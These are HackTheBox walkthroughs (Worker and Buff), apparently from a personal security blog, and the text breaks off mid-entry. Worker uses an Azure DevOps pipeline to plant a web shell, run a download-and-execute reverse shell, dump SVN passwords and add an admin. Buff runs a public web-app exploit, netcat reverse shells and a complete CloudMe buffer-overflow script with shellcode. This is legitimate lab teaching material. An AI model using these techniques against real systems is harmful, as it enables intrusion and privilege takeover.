- - - - - - - - - - - - - - - - - - - - - r4 | nathen | 2020–06–20 09:50:20 -0400 (Sat, 20 Jun 2020) | 1 line Moving this repo to our new devops server which will handle the deployment for us - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - r3 | nathen | 2020–06–20 09:46:19 -0400 (Sat, 20 Jun 2020) | 1 line - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - r2 | nathen | 2020–06–20 09:45:16 -0400 (Sat, 20 Jun 2020) | 1 line Added deployment script - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - r1 | nathen | 2020–06–20 09:43:43 -0400 (Sat, 20 Jun 2020) | 1 line First version - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - The commit message on r2 seems interesting.\nI can check the differences between r1 and r2 using the subcommand diff. The output shows there is a hard-coded credentials.\n→ root@kali «worker» «192.168.2.103» $ svn diff -r 1:2 svn://10.10.10.203/  From here, I\u0026rsquo;ll take note about what I\u0026rsquo;ve found here.\n Two subdomains: dimension.worker.htb and devops.worker.htb A set of credentials: nathen:wendel98  I\u0026rsquo;ll add those two subdomains to my /etc/hosts file.\n10.10.10.203 dimension.worker.htb devops.worker.htb Then after I make sure there is nothing left, I\u0026rsquo;ll revisit port 80 with the newly discovered subdomain.\nTCP 80 - dimension.worker.htb Visiting dimension.worker.htb presented with a static page.\n It even leads to others static site (with subdomain) which I think they are just decoy.\n Before moving on, I\u0026rsquo;ll add all the subdomains I found on /#work to my /etc/hosts. They are:\n alpha.worker.htb cartoon.worker.htb lens.worker.htb solid-state.worker.htb spectral.worker.htb story.worker.htb  Now I\u0026rsquo;ll jump over to the mentioned new DevOps server at http://devops.worker.htb.\nFoothold Shell as IIS appool Azure DevOps - SmartHotel360 Visiting http://devops.worker.htb pops an authentication prompt. It logs me in after I entered the credentials I obtained from SVN, and the user, nathen, is currently working on a project called \u0026ldquo;SmartHotel360\u0026rdquo;.\n My first objective is to find out what permission do this user have. I clicked the project and try to lookup into the Project Settings.\n User permission or group related settings are found to be under the Security menu (Project Settings -\u0026gt; Security Settings).\nIt seems user nathen is the only member of the SmartHotel360 Team.\n And the SmartHotel360 team is a member of Contributors group and Projects Valid Users, and this is added by default upon creating a team group.\n The Contributors group and Projects Valid Users group permissions are defined here, and user nathen inherits those two groups' permission.\n From there, I try to lookup into the project\u0026rsquo;s repository.\nI find a bunch of website repositories on the Repos menu. These repositories are previously listed on http://dimension.worker.htb/#work page. User nathen is the author of these repositories.\n On the Pipelines menu, there are Azure Pipelines for some of the sites. Azure Pipelines is CICD feature from Azure DevOps. It is similar to GitHub Action that I use to rebuild this static site using Hugo when there is a new commit pushed into the main/master branch.\n My video recommendation about CICD: https://www.youtube.com/watch?v=scEDHsr3APg\n  User nathen is allowed to queue a builds.\n With all of these permission, I can make changes such as dropping a web shell to one of the site repositories that has its own pipeline, say the alpha repository which has Alpha-CI, then I can queue those changes to the pipelines and wait until the site re-deployed/hosted. From there, I should be able to access my web-shell.\nWebshell Upload On my first attempt, it tells me to use pull requests instead of uploading a file directly to the master branch.\nSo, I\u0026rsquo;ll upload my web shell which is cmdasp.aspx (because the web server is IIS) on a new branch. I’ll be using the alpha repository.\n I\u0026rsquo;ll pick any available work items.\n I can just drag and drop the web shell, and commit it afterwards.\n From here, I can create a pull request to the master branch to trigger the pipelines or run the Alpha-CI build manually.\nIf I choose a pull request, it needs to be reviewed first and the reviewer is the user nathen itself, it can decide whether to approve or reject the pull request (well, actually it was me who decide it). It then queue the build.\n The other options is with this queue builds. I can skip the review and run the queue builds for my branch (on the image it is shell branch instead of iamf).\n After the build finished, I can see my web shell is available at alpha.worker.htb/cmdasp.aspx.\n To gain an interactive shell, I\u0026rsquo;ll setup a netcat listener on my Kali, then I\u0026rsquo;ll upload a PowerShell reverse shell called itsf.ps1 and execute it via the web shell.\npowershell.exe \u0026#34;mkdir c:/temp;invoke-webrequest -uri 10.10.14.19/itsf.ps1 -outfile C:\\temp\\itsf.ps1;C:\\temp\\itsf.ps1\u0026#34; I have a shell now on my listener.\n Privilege Escalation Shell as robisl Internal Enumeration Enumerating the user groups and privileges using the whoami /all command reveals that IIS appool has SeImpersonatePrivilege which according to BookHackTrick, it can be abused using RogueWinRM.\n Unfortunately, the WinRM port was already open, I couldn’t exploit it with RogueWinRM. But, I managed to find another way!\nEnumerating the Users folder finds two users, robisl and restorer (as the name implies, it restore the box configuration, I\u0026rsquo;ll ignore this).\n By using the net command, it shows that robisl can login remotely.\nPS C:\\Users\u0026gt; net user robisl User name robisl Full Name Robin Islip Comment User’s comment Country/region code 000 (System Default) Account active Yes Account expires Never Password last set 2020-04-05 21:27:26 Password expires Never Password changeable 2020-04-05 21:27:26 Password required No User may change password No Workstations allowed All Logon script User profile Home directory Last logon 2020-08-18 18:28:36 Logon hours allowed All Local Group Memberships *Production *Remote Global Group memberships *None The command completed successfully. With net command, I also find there is another drive mounted as W:\\\nPS C:\\users\\\u0026gt;net share Share name Resource Remark ------------------------------------------------------------------------------- C$ C:\\ Default share IPC$ Remote IPC W$ W:\\ Default share ADMIN$ C:\\Windows Remote Admin The command completed successfully. There are 4 folders in the W:\\ drive, the one that interesting is the svnrepos folder.\nPS W:\\\u0026gt; dir Directory: W:\\ Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 2020-06-16 18:59 agents d----- 2020-03-28 15:57 AzureDevOpsData d----- 2020-04-03 11:31 sites d----- 2020-06-20 16:04 svnrepos I can enumerate all folder and sub folder on the W:\\ drive recursively using the dir command. Because I\u0026rsquo;m on PowerShell, I have to use cmd /c \u0026lt;command\u0026gt; keyword.\nPS W:\\\u0026gt; cmd.exe /c \u0026quot;dir /s /b svnrepos\u0026quot; Well PowerShell can do that too, but I prefer cmd.\nPS W:\\\u0026gt; Get-ChildItem -Path W:\\svnrepos -Filter * -Recurse -ErrorAction SilentlyContinue -Force In the output, there is a passwd file that immediately draws my attention\n The passwd file contains a bunch of credentials, and my eyes caught the password for robisl.\nPS W:\\svnrepos\\\u0026gt; gc .\\www\\conf\\passwd ### This file is an example password file for svnserve. ### Its format is similar to that of svnserve.conf. As shown in the ### example below it contains one section labelled [users]. ### The name and password for each user follow, one account per line. [users] nathen = wendel98 nichin = fqerfqerf nichin = asifhiefh noahip = player nuahip = wkjdnw oakhol = bxwdjhcue owehol = supersecret paihol = painfulcode parhol = gitcommit pathop = iliketomoveit pauhor = nowayjose payhos = icanjive perhou = elvisisalive peyhou = ineedvacation phihou = pokemon quehub = pickme quihud = kindasecure rachul = guesswho raehun = idontknow ramhun = thisis ranhut = getting rebhyd = rediculous reeinc = iagree reeing = tosomepoint reiing = isthisenough renipr = dummy rhiire = users riairv = canyou ricisa = seewhich robish = onesare robisl = wolves11 robive = andwhich ronkay = onesare rubkei = the rupkel = sheeps ryakel = imtired sabken = drjones samken = aqua sapket = hamburger sarkil = friday Remote Access - robisl I can login remotely using robisl credentials with evil-winrm.\n→ root@kali «worker» «10.10.14.19» $ evil-winrm -i 10.10.10.203 -u robisl -p wolves11 Evil-WinRM shell v2.3 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\robisl\\Documents\u0026gt; whoami worker\\robisl *Evil-WinRM* PS C:\\Users\\robisl\\Documents\u0026gt; cd ../Desktop *Evil-WinRM* PS C:\\Users\\robisl\\Desktop\u0026gt; dir Directory: C:\\Users\\robisl\\Desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -ar--- 1/29/2020 3:37 PM 34 user.txt Shell as administrator Azure DevOps - PartsUnlimited After enumerating many things in the remote shell and coming up empty-handed, I returned to Azure DevOps, but this time with a robisl account.\n Long short story, robisl  is member of Build Administrator.\n The Build Administrators defined as follows [source].\n Exploit Azure Pipelines - Read the Root Flag So the plan is, I’ll create an Azure pipelines with malicious deployment script/task to execute OS commands.\n If I lookup into the agent pool in the Project Settings menu, there is an available agent named ‘Setup’. The agent is owned by an Administrator account, and as a Build Administrator member (inherited), user robisl also has access to it.\n So, let’s execute the plan!\nFirst, I’ll create a pipeline (Pipelines -\u0026gt; Builds -\u0026gt; New Pipeline).\n In the next section, I’ll choose Azure Repos Git.\n On the next one, I’ll select \u0026ldquo;PartsUnlimited\u0026rdquo; as the repository, because that is the repo where robisl is working on.\n In the Configure section, scroll down and select the starter pipeline (I forgot the name, but don\u0026rsquo;t choose the existing one). After that, I’ll modify the pool and the script in the \u0026ldquo;Review\u0026rdquo; section to steal the flag.\n The master branch will be the trigger to run the CI\\CD (If I push a changes to the \u0026ldquo;PartsUnlimited\u0026rdquo; repository). Since I have access to the \u0026ldquo;Setup\u0026rdquo; pool, I\u0026rsquo;ll use it as the pool. Lastly, on the steps you can add a task/script you want to run/do. In my case, I want to read the root flag.\nI’ll save it and run it on a new branch.\n I’ll just wait for the output log.\n Once it completed, I can see the root flag inside the \u0026ldquo;Steal the flag\u0026rdquo; output\n Create User with Administrator Privileges I can also create a privileged user using multi-line script.\n- script: | net user iamf YourComplexPassword /add /domain net localgroup Administrators iamf /add net localgroup \u0026quot;Remote Management Users\u0026quot; iamf /add displayName: \u0026quot;Set IamF to Admin\u0026quot; I can push it again and wait for it to complete.\n Now I can login with the newly created user.\n  References:\n https://docs.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops https://adamtheautomator.com/powershell-scripts-azure-devops-pipelines/ https://docs.microsoft.com/en-us/azure/devops/pipelines/repos/azure-repos-git?view=azure-devops\u0026amp;tabs=yaml#ci-triggers  ","permalink":"https://fahmifj.github.io/writeups/hackthebox/htb-worker/","summary":"Worker is a medium difficulty Windows machine that features a self-hosted Apache Subversion and Azure DevOps server. Enumerating the Subversion server discovers a set of credentials and a subdomain at which the Azure DevOps is hosted. The credentials can be used to login into Azure DevOps server, which then leveraged to gain a foothold on the box by dropping a web shell. Enumeration inside the box finds another set of credentials that also can be used to login into the Azure DevOps.","tags":["OSCP-like","Windows","Active-Directory","Svn","Webshell","Azure-DevOps","Azure-Pipelines"],"title":"HackTheBox - Worker"},{"content":"Buff is a Windows machine with easy difficulty from HackTheBox that features an open source web application called \u0026ldquo;Gym Management System\u0026rdquo;. The application can be exploited using a publicly available exploit. Internal enumeration discovers a program service that is bound to the loopback interface. The program is found to be vulnerable to a buffer overflow attack, and there is also a publicly available exploit to exploit it to gain access as Administrator. Because it is bound to the loopback interface, hence a setup for port forwarding is required before sending the exploit.\nSkills Learned  Gym Management System 1.0 Exploitation Port Forwarding CloudMe 1.12 Exploitation  Tools  Kali Linux (Attacking Machine) - https://www.kali.org/ Nmap - Preinstalled in Kali Linux searchsploit/Exploit-DB - Preinstalled in Kali Linux chisel - https://github.com/jpillora/chisel/releases msfvenom - Preinstalled in Kali Linux  Reconnaissance Nmap An initial scan with nmap only discovers one port open on 8080 running an Apache web server.\n→ root@kali «~» «10.10.14.18» $ mkdir nmap; nmap -sC -sV -oN nmap/initial-buff -v 10.10.10.198 PORT STATE SERVICE VERSION 8080/tcp open http Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-open-proxy: Proxy might be redirecting requests |_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6 |_http-title: mrb3n’s Bro Hut Enumeration TCP 8080 - Website Visiting port 8080 displays a website for a Gym, on the title it is called \u0026ldquo;mrb3n\u0026rsquo;s Bro Hut\u0026rdquo;.\nClicking on the contact page discovers the name of the software behind this web application.\nSearchsploit I can feed the software name to searchsploit. It shows several exploits, and one that stands out is the remote code execution.\n→ root@kali «machines» «10.10.14.18» $ searchsploit Gym Management System 1.0 ------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path ------------------------------------------------------------------------------- --------------------------------- Gym Management System 1.0 - \u0026#39;id\u0026#39; SQL Injection | php/webapps/48936.txt Gym Management System 1.0 - Authentication Bypass | php/webapps/48940.txt Gym Management System 1.0 - Stored Cross Site Scripting | php/webapps/48941.txt Gym Management System 1.0 - Unauthenticated Remote Code Execution | php/webapps/48506.py ------------------------------------------------------------------------------- --------------------------------- Foothold Shell as shaun searchsploit -m allows me to mirror/make a copy of the \u0026ldquo;Gym Management System 1.0 - Unauthenticated Remote Code Execution\u0026rdquo; exploit to the current working directory\n→ root@kali «exploit» «10.10.14.18» $ searchsploit -m 48506 Exploit: Gym Management System 1.0 - Unauthenticated Remote Code Execution URL: https://www.exploit-db.com/exploits/48506 Path: /usr/share/exploitdb/exploits/php/webapps/48506.py File Type: Python script, ASCII text executable, with CRLF line terminators Copied to: /root/htb/machines/buff/exploit/48506.py → root@kali «exploit» «10.10.14.18» $ ls -l total 8 -rwxr-xr-x 1 root root 5164 May 2 04:29 48506.py I’ll rename 48506.py to exploit.py, and run it afterwards.\n→ root@kali «exploit» «10.10.14.18» $ python exploit.py http://10.10.10.198:8080/ With current pseudo shell access, I can\u0026rsquo;t change my directory but I can still grab the user flag.\nC:\\xampp\\htdocs\\gym\\upload\u0026gt; type \\users\\shaun\\desktop\\user.txt Upgrade to Interactive Shell To make the shell a bit more comfy, I uploaded a netcat using powershell to Buff, and then I\u0026rsquo;ll create another reverse shell session.\nFirst, I\u0026rsquo;ll host the 64 bit netcat, nc64.exe.\n→ root@kali «buff» «10.10.14.18» $ python -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 10.10.10.198 - - [14/Aug/2020 10:11:02] \u0026#34;GET /nc64.exe HTTP/1.1\u0026#34; 200 On Buff, I\u0026rsquo;ll grab the hosted nc64.exe using PowerShell.\nC:\\xampp\\htdocs\\gym\\upload\u0026gt; powershell.exe \u0026#34;invoke-webrequest -uri http://10.10.14.18/nc64.exe -outfile nc.exe\u0026#34; Now I\u0026rsquo;ll setup a listener on my Kali, and send a reverse shell from Buff using the downloaded nc.exe.\nC:\\xampp\\htdocs\\gym\\upload\u0026gt;.\\nc.exe -e cmd.exe 10.10.14.18 9001 I have a \u0026ldquo;proper\u0026rdquo; shell now\n→ root@kali «buff» «10.10.14.18» $ nc -nvlp 9001 listening on [any] 9001 ... connect to [10.10.14.18] from (UNKNOWN) [10.10.10.198] 64518 Microsoft Windows [Version 10.0.17134.1550] (c) 2018 Microsoft Corporation. All rights reserved. C:\\xampp\\htdocs\\gym\\upload\u0026gt; Privilege Escalation Shell as Administrator Enumeration After enumerating the Users folder, I noticed a slightly different output when typing the dir command in shaun home directory.\n In the Download folder, there is an executable file called CloudMe_1112.exe where 1112 is likely a version number.\nChecking on currently running services with netstat discovers.\nC:\\xampp\\htdocs\\gym\\upload\u0026gt; netstat -aonp tcp Active Connections Proto Local Address Foreign Address State PID ...\u0026lt;SNIP\u0026gt;... TCP 127.0.0.1:8888 0.0.0.0:0 LISTENING 7352 ...\u0026lt;SNIP\u0026gt;... I can search the program name using the tasklist command.\nC:\\xampp\\htdocs\\gym\\upload\u0026gt; tasklist /FI “PID eq 7352\u0026quot; /v /FO list So PID 7352 on port 8888 is running CloudMe.exe.\nBecause the user name field is showing as N/A, one possible thing is that I don’t have enough privilege to dig for more information about the process because it might be running with a higher privilege (either administrator or a local system).\nSearchsploit A quick search about \u0026ldquo;CloudMe\u0026rdquo; on searchsploit pops several buffer overflow exploits with four of them are exact match.\n→ root@kali «buff» «10.10.14.18» $ searchsploit CloudMe ------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path ------------------------------------------------------------------------------- --------------------------------- CloudMe 1.11.2 - Buffer Overflow (PoC) | windows/remote/48389.py CloudMe 1.11.2 - Buffer Overflow (SEH_DEP_ASLR) | windows/local/48499.txt CloudMe 1.11.2 - Buffer Overflow ROP (DEP_ASLR) | windows/local/48840.py Cloudme 1.9 - Buffer Overflow (DEP) (Metasploit) | windows_x86-64/remote/45197.rb CloudMe Sync 1.10.9 - Buffer Overflow (SEH)(DEP Bypass) | windows_x86-64/local/45159.py CloudMe Sync 1.10.9 - Stack-Based Buffer Overflow (Metasploit) | windows/remote/44175.rb CloudMe Sync 1.11.0 - Local Buffer Overflow | windows/local/44470.py CloudMe Sync 1.11.2 - Buffer Overflow + Egghunt | windows/remote/46218.py CloudMe Sync 1.11.2 Buffer Overflow - WoW64 (DEP Bypass) | windows_x86-64/remote/46250.py CloudMe Sync \u0026lt; 1.11.0 - Buffer Overflow | windows/remote/44027.py CloudMe Sync \u0026lt; 1.11.0 - Buffer Overflow (SEH) (DEP Bypass) | windows_x86-64/remote/44784.py ------------------------------------------------------------------------------- --------------------------------- Tunneling The CloudMe program is currently listening on localhost (bound), so to interact with it, I\u0026rsquo;ll have to setup a tunnel/port forwarding. For this, I\u0026rsquo;ll use chisel (https://github.com/jpillora/chisel/releases).\n Example usage of chisel is explained better in this blog :\n https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html#chisel   First, I\u0026rsquo;ll transfer the Windows version of chisel to Buff via PowerShell.\nC:\\Users\\shaun\\Download\u0026gt; powershell.exe \u0026#34;invoke-webrequest -uri http://10.10.14.18/chisel.exe -outfile cs.exe\u0026#34; Second, I\u0026rsquo;ll setup a chisel server on my Kali.\n→ root@kali «buff» «10.10.14.18» $ chisel server -p 9002 2020/08/14 13:22:18 server: Fingerprint 35:fe:d3:dd:6c:b3:63:35:87:6a:f2:70:52:f1:82:e2 2020/08/14 13:22:18 server: Listening on 0.0.0.0:9002... On Buff, I\u0026rsquo;ll connect as client to my chisel server on Kali.\nC:\\Users\\shaun\\Download\u0026gt; .\\cs.exe client 10.10.14.18:9002 R:8888:127.0.0.1:8888 This, will forward the traffics that sent from my Kali Linux on port 8888 to Buff\u0026rsquo;s localhost on port 8888.\nKali localhost:8888 \u0026lt;-\u0026gt; (Kali 10.10.14.18:9002 \u0026lt;-\u0026gt; Buff:10.10.10.198:XXX) \u0026lt;-\u0026gt; Buff localhost:8888 Exploitation I\u0026rsquo;ll use this exploit PoC (I\u0026rsquo;ve renamed it to bofexploit.py) but I\u0026rsquo;ll have to modify the payload with my own.\n# Exploit Title: CloudMe 1.11.2 - Buffer Overflow (PoC) # Date: 2020-04-27 # Exploit Author: Andy Bowden # Vendor Homepage: https://www.cloudme.com/en # Software Link: https://www.cloudme.com/downloads/CloudMe_1112.exe # Version: CloudMe 1.11.2 # Tested on: Windows 10 x86 #Instructions: # Start the CloudMe service and run the script. import socket target = \u0026#34;127.0.0.1\u0026#34; padding1 = b\u0026#34;\\x90\u0026#34; * 1052 EIP = b\u0026#34;\\xB5\\x42\\xA8\\x68\u0026#34; # 0x68A842B5 -\u0026gt; PUSH ESP, RET NOPS = b\u0026#34;\\x90\u0026#34; * 30 #msfvenom -a x86 -p windows/exec CMD=calc.exe -b \u0026#39;\\x00\\x0A\\x0D\u0026#39; -f python payload = b\u0026#34;\\xba\\xad\\x1e\\x7c\\x02\\xdb\\xcf\\xd9\\x74\\x24\\xf4\\x5e\\x33\u0026#34; payload += b\u0026#34;\\xc9\\xb1\\x31\\x83\\xc6\\x04\\x31\\x56\\x0f\\x03\\x56\\xa2\\xfc\u0026#34; payload += b\u0026#34;\\x89\\xfe\\x54\\x82\\x72\\xff\\xa4\\xe3\\xfb\\x1a\\x95\\x23\\x9f\u0026#34; payload += b\u0026#34;\\x6f\\x85\\x93\\xeb\\x22\\x29\\x5f\\xb9\\xd6\\xba\\x2d\\x16\\xd8\u0026#34; payload += b\u0026#34;\\x0b\\x9b\\x40\\xd7\\x8c\\xb0\\xb1\\x76\\x0e\\xcb\\xe5\\x58\\x2f\u0026#34; payload += b\u0026#34;\\x04\\xf8\\x99\\x68\\x79\\xf1\\xc8\\x21\\xf5\\xa4\\xfc\\x46\\x43\u0026#34; payload += b\u0026#34;\\x75\\x76\\x14\\x45\\xfd\\x6b\\xec\\x64\\x2c\\x3a\\x67\\x3f\\xee\u0026#34; payload += b\u0026#34;\\xbc\\xa4\\x4b\\xa7\\xa6\\xa9\\x76\\x71\\x5c\\x19\\x0c\\x80\\xb4\u0026#34; payload += b\u0026#34;\\x50\\xed\\x2f\\xf9\\x5d\\x1c\\x31\\x3d\\x59\\xff\\x44\\x37\\x9a\u0026#34; payload += b\u0026#34;\\x82\\x5e\\x8c\\xe1\\x58\\xea\\x17\\x41\\x2a\\x4c\\xfc\\x70\\xff\u0026#34; payload += b\u0026#34;\\x0b\\x77\\x7e\\xb4\\x58\\xdf\\x62\\x4b\\x8c\\x6b\\x9e\\xc0\\x33\u0026#34; payload += b\u0026#34;\\xbc\\x17\\x92\\x17\\x18\\x7c\\x40\\x39\\x39\\xd8\\x27\\x46\\x59\u0026#34; payload += b\u0026#34;\\x83\\x98\\xe2\\x11\\x29\\xcc\\x9e\\x7b\\x27\\x13\\x2c\\x06\\x05\u0026#34; payload += b\u0026#34;\\x13\\x2e\\x09\\x39\\x7c\\x1f\\x82\\xd6\\xfb\\xa0\\x41\\x93\\xf4\u0026#34; payload += b\u0026#34;\\xea\\xc8\\xb5\\x9c\\xb2\\x98\\x84\\xc0\\x44\\x77\\xca\\xfc\\xc6\u0026#34; payload += b\u0026#34;\\x72\\xb2\\xfa\\xd7\\xf6\\xb7\\x47\\x50\\xea\\xc5\\xd8\\x35\\x0c\u0026#34; payload += b\u0026#34;\\x7a\\xd8\\x1f\\x6f\\x1d\\x4a\\xc3\\x5e\\xb8\\xea\\x66\\x9f\u0026#34; overrun = b\u0026#34;C\u0026#34; * (1500 - len(padding1 + NOPS + EIP + payload)) buf = padding1 + EIP + NOPS + payload + overrun try: s=socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((target,8888)) s.send(buf) except Exception as e: print(sys.exc_value) To generate new payload, I\u0026rsquo;ll follow the instruction on the PoC code which is using msfvenom. But, instead of running calc.exe, I\u0026rsquo;ll change it to execute the netcat I\u0026rsquo;ve uploaded before during upgrading the shaun shell.\n→ root@kali «buff» «10.10.14.18» $ msfvenom -p windows/exec CMD=\u0026#39;C:\\xampp\\htdocs\\gym\\upload\\nc.exe -e cmd.exe 10.10.14.18 9005\u0026#39; -b \u0026#39;\\x00\\x0A\\x0D\u0026#39; -f python -v payload ...\u0026lt;SNIP\u0026gt;... payload += b\u0026#34;\\xbe\\xd0\\xe7\\xa9\\x73\\xd9\\xc7\\xd9\\x74\\x24\\xf4\\x5f\u0026#34; payload += b\u0026#34;\\x31\\xc9\\xb1\\x3e\\x31\\x77\\x12\\x03\\x77\\x12\\x83\\x17\u0026#34; payload += b\u0026#34;\\xe3\\x4b\\x86\\x6b\\x04\\x09\\x69\\x93\\xd5\\x6e\\xe3\\x76\u0026#34; payload += b\u0026#34;\\xe4\\xae\\x97\\xf3\\x57\\x1f\\xd3\\x51\\x54\\xd4\\xb1\\x41\u0026#34; payload += b\u0026#34;\\xef\\x98\\x1d\\x66\\x58\\x16\\x78\\x49\\x59\\x0b\\xb8\\xc8\u0026#34; payload += b\u0026#34;\\xd9\\x56\\xed\\x2a\\xe3\\x98\\xe0\\x2b\\x24\\xc4\\x09\\x79\u0026#34; payload += b\u0026#34;\\xfd\\x82\\xbc\\x6d\\x8a\\xdf\\x7c\\x06\\xc0\\xce\\x04\\xfb\u0026#34; payload += b\u0026#34;\\x91\\xf1\\x25\\xaa\\xaa\\xab\\xe5\\x4d\\x7e\\xc0\\xaf\\x55\u0026#34; payload += b\u0026#34;\\x63\\xed\\x66\\xee\\x57\\x99\\x78\\x26\\xa6\\x62\\xd6\\x07\u0026#34; payload += b\u0026#34;\\x06\\x91\\x26\\x40\\xa1\\x4a\\x5d\\xb8\\xd1\\xf7\\x66\\x7f\u0026#34; payload += b\u0026#34;\\xab\\x23\\xe2\\x9b\\x0b\\xa7\\x54\\x47\\xad\\x64\\x02\\x0c\u0026#34; payload += b\u0026#34;\\xa1\\xc1\\x40\\x4a\\xa6\\xd4\\x85\\xe1\\xd2\\x5d\\x28\\x25\u0026#34; payload += b\u0026#34;\\x53\\x25\\x0f\\xe1\\x3f\\xfd\\x2e\\xb0\\xe5\\x50\\x4e\\xa2\u0026#34; payload += b\u0026#34;\\x45\\x0c\\xea\\xa9\\x68\\x59\\x87\\xf0\\xe6\\x9c\\x15\\x8f\u0026#34; payload += b\u0026#34;\\x45\\x9e\\x25\\x8f\\xf9\\xf7\\x14\\x04\\x96\\x80\\xa8\\xcf\u0026#34; payload += b\u0026#34;\\xd2\\x7f\\xe3\\x4d\\x72\\xe8\\xaa\\x04\\xc6\\x75\\x4d\\xf3\u0026#34; payload += b\u0026#34;\\x05\\x80\\xce\\xf1\\xf5\\x77\\xce\\x70\\xf3\\x3c\\x48\\x69\u0026#34; payload += b\u0026#34;\\x89\\x2d\\x3d\\x8d\\x3e\\x4d\\x14\\xce\\xfa\\xed\\xe2\\xa3\u0026#34; payload += b\u0026#34;\\x9f\\x7f\\x7e\\x1f\\x13\\xe8\\xe1\\xea\\xbd\\xb4\\x85\\x7b\u0026#34; payload += b\u0026#34;\\x35\\x2b\\x2a\\xec\\xd8\\xd7\\xc1\\xae\\x74\\x7b\\x08\\x2b\u0026#34; payload += b\u0026#34;\\xf1\\x1e\\x74\\x9e\\x64\\xc1\\x17\\x8d\\x02\\x2f\\xbd\\x35\u0026#34; payload += b\u0026#34;\\xae\\x0f\\x0c\\xf5\\x1e\\x61\\x5e\\xdb\\x6f\\xb5\\xb0\\x16\u0026#34; payload += b\u0026#34;\\xa4\\x95\\xf5\\x68\\xf4\\xe0\\x05\u0026#34; After removed the comments and changed the payload, the bofexploit.py now look like this:\nimport socket target = \u0026#34;127.0.0.1\u0026#34; padding1 = b\u0026#34;\\x90\u0026#34; * 1052 EIP = b\u0026#34;\\xB5\\x42\\xA8\\x68\u0026#34; # 0x68A842B5 -\u0026gt; PUSH ESP, RET NOPS = b\u0026#34;\\x90\u0026#34; * 30 payload += b\u0026#34;\\xbe\\xd0\\xe7\\xa9\\x73\\xd9\\xc7\\xd9\\x74\\x24\\xf4\\x5f\u0026#34; payload += b\u0026#34;\\x31\\xc9\\xb1\\x3e\\x31\\x77\\x12\\x03\\x77\\x12\\x83\\x17\u0026#34; payload += b\u0026#34;\\xe3\\x4b\\x86\\x6b\\x04\\x09\\x69\\x93\\xd5\\x6e\\xe3\\x76\u0026#34; payload += b\u0026#34;\\xe4\\xae\\x97\\xf3\\x57\\x1f\\xd3\\x51\\x54\\xd4\\xb1\\x41\u0026#34; payload += b\u0026#34;\\xef\\x98\\x1d\\x66\\x58\\x16\\x78\\x49\\x59\\x0b\\xb8\\xc8\u0026#34; payload += b\u0026#34;\\xd9\\x56\\xed\\x2a\\xe3\\x98\\xe0\\x2b\\x24\\xc4\\x09\\x79\u0026#34; payload += b\u0026#34;\\xfd\\x82\\xbc\\x6d\\x8a\\xdf\\x7c\\x06\\xc0\\xce\\x04\\xfb\u0026#34; payload += b\u0026#34;\\x91\\xf1\\x25\\xaa\\xaa\\xab\\xe5\\x4d\\x7e\\xc0\\xaf\\x55\u0026#34; payload += b\u0026#34;\\x63\\xed\\x66\\xee\\x57\\x99\\x78\\x26\\xa6\\x62\\xd6\\x07\u0026#34; payload += b\u0026#34;\\x06\\x91\\x26\\x40\\xa1\\x4a\\x5d\\xb8\\xd1\\xf7\\x66\\x7f\u0026#34; payload += b\u0026#34;\\xab\\x23\\xe2\\x9b\\x0b\\xa7\\x54\\x47\\xad\\x64\\x02\\x0c\u0026#34; payload += b\u0026#34;\\xa1\\xc1\\x40\\x4a\\xa6\\xd4\\x85\\xe1\\xd2\\x5d\\x28\\x25\u0026#34; payload += b\u0026#34;\\x53\\x25\\x0f\\xe1\\x3f\\xfd\\x2e\\xb0\\xe5\\x50\\x4e\\xa2\u0026#34; payload += b\u0026#34;\\x45\\x0c\\xea\\xa9\\x68\\x59\\x87\\xf0\\xe6\\x9c\\x15\\x8f\u0026#34; payload += b\u0026#34;\\x45\\x9e\\x25\\x8f\\xf9\\xf7\\x14\\x04\\x96\\x80\\xa8\\xcf\u0026#34; payload += b\u0026#34;\\xd2\\x7f\\xe3\\x4d\\x72\\xe8\\xaa\\x04\\xc6\\x75\\x4d\\xf3\u0026#34; payload += b\u0026#34;\\x05\\x80\\xce\\xf1\\xf5\\x77\\xce\\x70\\xf3\\x3c\\x48\\x69\u0026#34; payload += b\u0026#34;\\x89\\x2d\\x3d\\x8d\\x3e\\x4d\\x14\\xce\\xfa\\xed\\xe2\\xa3\u0026#34; payload += b\u0026#34;\\x9f\\x7f\\x7e\\x1f\\x13\\xe8\\xe1\\xea\\xbd\\xb4\\x85\\x7b\u0026#34; payload += b\u0026#34;\\x35\\x2b\\x2a\\xec\\xd8\\xd7\\xc1\\xae\\x74\\x7b\\x08\\x2b\u0026#34; payload += b\u0026#34;\\xf1\\x1e\\x74\\x9e\\x64\\xc1\\x17\\x8d\\x02\\x2f\\xbd\\x35\u0026#34; payload += b\u0026#34;\\xae\\x0f\\x0c\\xf5\\x1e\\x61\\x5e\\xdb\\x6f\\xb5\\xb0\\x16\u0026#34; payload += b\u0026#34;\\xa4\\x95\\xf5\\x68\\xf4\\xe0\\x05\u0026#34; overrun = b\u0026#34;C\u0026#34; * (1500 — len(padding1 + NOPS + EIP + payload)) buf = padding1 + EIP + NOPS + payload + overrun try: s=socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((target,8888)) s.send(buf) except Exception as e: print(sys.exc_value) The exploit is ready, and now I’ll setup a listener on the same port with the one I’ve assigned to the payload and run the exploit afterwards.\n→ root@kali «buff» «10.10.14.18» $ python2 bofexploit.py On my listener:\nNow I can grab the root flag or dump the hashes.\n References  https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html https://bufferoverflows.net/practical-exploitation-part-1-cloudme-sync-1-11-2-bufferoverflow-seh/  ","permalink":"https://fahmifj.github.io/writeups/hackthebox/htb-buff/","summary":"Buff is a Windows machine with easy difficulty 